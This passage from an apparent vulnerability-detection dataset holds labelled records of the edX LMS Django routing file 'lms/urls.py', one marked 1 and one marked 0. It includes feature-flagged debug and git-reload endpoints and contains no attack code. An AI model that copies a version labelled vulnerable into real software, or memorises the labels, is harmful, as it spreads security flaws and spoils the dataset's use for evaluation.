'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 1}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    ## Jasmine and admin\n    urlpatterns += (url(r'^admin/', include(admin.site.urls)),)\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID'):\n    urlpatterns += (\n        url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'),\n        url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),\n        url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'),\n    )\n\nif settings.MITX_FEATURES.get('AUTH_USE_SHIB'):\n    urlpatterns += (\n        url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'),\n    )\n\nif settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'):\n    urlpatterns += (\n        url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_login', name='course-specific-login'),\n        url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'external_auth.views.course_specific_register', name='course-specific-register'),\n\n    )\n\n\nif settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'):\n    urlpatterns += (\n        url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'),\n        url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n/n/n/n", "label": 0}, {"id": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78", "code": "/lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % 